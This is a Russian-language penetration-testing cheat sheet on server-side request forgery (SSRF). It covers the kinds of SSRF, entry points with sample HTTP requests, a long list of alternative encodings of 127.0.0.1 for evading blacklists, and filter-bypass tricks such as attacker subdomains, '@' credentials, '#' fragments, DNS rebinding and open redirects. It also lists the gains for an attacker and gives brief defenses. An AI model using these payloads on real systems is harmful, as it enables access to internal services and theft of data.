###SSRF(server)

* **Описание**
	
	Server-Side Request Forgery — подделка запросов на стороне сервера. С помощью этой уязвимости злоумышленник отправляет запросы от имени сервера к внешним или внутренним ресурсам. Например, к базе данных на другом сервере или любому сайту, с которым работает приложение.
	
* **Виды**
*    SSRF-атака на сервер. Злоумышленник заставляет сервер установить соединение с внутренними сервисами в инфраструктуре организации.
*   SSRF-атака на другие внутренние системы. Злоумышленник заставляет подключиться к произвольным внешним системам. Здесь утечка конфиденциальных данных происходит намного проще.
*    Cлепой SSRF
*   SSRF через неправильно сформированную строку запроса**
Пользовательские прокси иногда не могут правильно проверить строку запроса, что может позволить вам предоставить необычный, неправильно сформированный ввод с неудачными результатами.
Например, обратный прокси может взять путь из строки запроса, добавить к нему префикс http://backend-server и направить запрос на этот URL-адрес восходящего потока. Это работает нормально, если путь начинается с символа /, но что, если вместо этого он начинается с символа @?
GET @private-intranet/example HTTP/1.1
Результирующий URL-адрес восходящего потока будет http://backend-server@private-intranet/example, что большинство библиотек HTTP интерпретируют как запрос на доступ к private-intranet с именем пользователя backend-server.
     
* **Точки входа и POC** 

	SSRF возникает там, где приложение пересылает предоставленный пользователем URL-адрес или другие входные данные на внешний сервер.
	Частичные URL-адреса в запросах
	URL-адреса в форматах данных
	SSRF через заголовок Referer


POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

url=http://sklad.yandexmarket.ru/product/stock/check?productId=6&storeId=1 
Например, можно использовать url=http://127.0.0.1 или url=http://localhost


Redirect:
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 (path=evil.url)
POST
stockApi=/product/stock/check?productId=3&storeId=1
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/

2130706433
017700000001
127.1
0x7f000001
0177.0.0.1
::ffff:127.0.0.1
::1
127.0.0.0
127.0.0.254
2130706432
http://[0000::1]:80
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
[::ffff:127.0.0.1]
[0:0:0:0:0:ffff:127.0.0.1]
[0000::1]:80
[0000::1]
127.0.1
http://0/
http://127.1
http://127.0.1
0
01111111000000000000000000000001
01111111.00000000.00000000.00000001
127.000.000.1
0x7f.0x0.0x0.0x1
0177.0.0.01
127.0.0.0
[::]:80
[::]:443
0000::1:80 

* **Профит**

    несанкционированные действия внутри системы,
    обход файрволов и других защитных механизмов,
    доступ к административным панелям,
    доступ к базам данных с возможностью чтения, модификации или удаления данных,
    доступ к данным организации (например, к API-ключам или метаданным облачных инфраструктур), что может привести к дальнейшей компрометации системы,
    если сервер может интерпретировать входящие запросы как команды, то злоумышленник может добиться удалённого выполнения кода.
    
    Доступ к внутренним системам компании.Среди них — внутренний портал, система контроля версий, репозитории с исходным кодом, бухгалтерские системы и другие.
    Сканирование внутренней сети. Злоумышленник сможет обращаться к IP-адресам во внутренней сети. Это позволит найти открытые порты, другие уязвимости и цели для атаки.
    Обход механизмов безопасности.Обычно у внутренних сервисов больше доверия к запросам. Так что SSRF позволит обойти некоторые проверки.
    Сокрытие следов атаки.Сложнее отследить злоумышленника, использующего внутренний сервер как прокси для маскировки своих действий. Все запросы отправляются от доверенного сервера.


* **Защита**

*    Лучшая защита — отсутствие функций, которые совершают запросы к другим ресурсам. 
Если без этого не обойтись:
*    Введи белый список разрешённых ресурсов. Проверяй весь URL вместе с протоколом https:// и нужным методом.
*    Добавь сетевые ограничения для сервиса. Это могут быть правила файрвола на хосте.
*    Используй анти-SSRF-прокси.
    
* **Обход защиты**

*    Белый список - Если мы создадим поддомен, например http://legit.some-company.ru.evil.com, то сможем обойти фильтры.
*    Черный список - представлений IP-адреса в других системах счислений.
    		    Заменим исходный http://localhost на http://LocalHost.
    		    DNS Rebinding - зарегистрировать домен, который будет преобразовываться в 127.0.0.1. Используя этот домен, тоже можно обойти ограничения. 
		    URL-адрес невосприимчив к регистру букв.	
		    Также мы можем вставить учётные данные в URL перед именем хоста, используя символ @. Например, https://expected-host:fakepassword@evil-host.
		    А ещё для обозначения фрагмента URL можно использовать символ #. Например, https://evil-host#expected-host.
*    Обход фильтров SSRF с помощью открытого перенаправления - При условии, что API, используемый для создания внутреннего HTTP-запроса, поддерживает перенаправления, вы можете создать URL-адрес, который удовлетворяет фильтру и приводит к перенаправлению запроса на желаемую внутреннюю цель. POST /product/nextProduct?currentProductId=1&path=/product?productId=2&(path=evil.url)



